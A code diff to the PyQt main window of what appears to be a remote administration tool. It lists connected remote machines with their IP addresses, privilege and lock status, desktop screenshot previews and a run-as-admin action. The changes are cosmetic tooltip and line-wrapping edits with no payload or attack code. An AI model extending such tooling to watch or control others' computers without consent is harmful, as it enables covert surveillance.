@@ -393,12 +393,14 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                       zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
                 screen_bits = im.convert('RGBA')
                 screen_bits.save(os.path.join(temp, 'bg.png'), 'png')
-                self.set_bg_preview()
+                self.set_bg_preview(client)
             except SyntaxError:
                 pass
 
-    def set_bg_preview(self):
-        self.serversTable.setToolTip('<img src="%s" width="400">' % os.path.join(temp, 'bg.png'))
+    def set_bg_preview(self, client):
+        self.serversTable.setToolTip(
+            '<p align="center" style="background-color: #2c3e50;color: #c9f5f7;">%s\'s Preview<br><img src="%s" width="400"></p>' % (
+                self.socks[client]['ip_address'], os.path.join(temp, 'bg.png')))
 
     def get_desktop_preview(self):
         client = self.current_client()
@@ -458,7 +460,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add user privileges
                 try:
-                    privs_status = _('INFO_USER') if not self.streaming_socks[obj]['privileges'] == '1' else _('INFO_ADMIN')
+                    privs_status = _('INFO_USER') if not self.streaming_socks[obj]['privileges'] == '1' else _(
+                        'INFO_ADMIN')
                 except KeyError:
                     print self.streaming_socks[obj]
                 item = QTableWidgetItem()
@@ -470,7 +473,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.serversTable.setItem(index, self.index_of_privs, item)
 
                 # add server lock status
-                lock_status = _('INFO_LOCKED') if self.streaming_socks[obj]['protection'] == 'False' else _('INFO_UNLOCKED')
+                lock_status = _('INFO_LOCKED') if self.streaming_socks[obj]['protection'] == 'False' else _(
+                    'INFO_UNLOCKED')
                 item = QTableWidgetItem(lock_status)
                 if lock_status == _('INFO_LOCKED'):
                     item.setTextColor(QColor('#e67e22'))
@@ -611,7 +615,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if self.serversTable.selectedItems():
 
             server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), _('RM_SET_ALIAS'), self.add_alias)
-            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _('RM_RUN_AS_ADMIN'), self.run_as_admin)
+            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _('RM_RUN_AS_ADMIN'),
+                                  self.run_as_admin)
             server_menu.addSeparator()
 
             if self.serversTable.item(server_index, self.index_of_lock).text() == _('INFO_UNLOCKED'):
@@ -766,8 +771,8 @@ DATE: %s/%s/%s %s:%s:%s
             log_file.write(log_value)
 
 
-#open('error.log', 'w').close()
-#sys.excepthook = handle_exception
+# open('error.log', 'w').close()
+# sys.excepthook = handle_exception
 
 # Run Application
 if __name__ == '__main__':
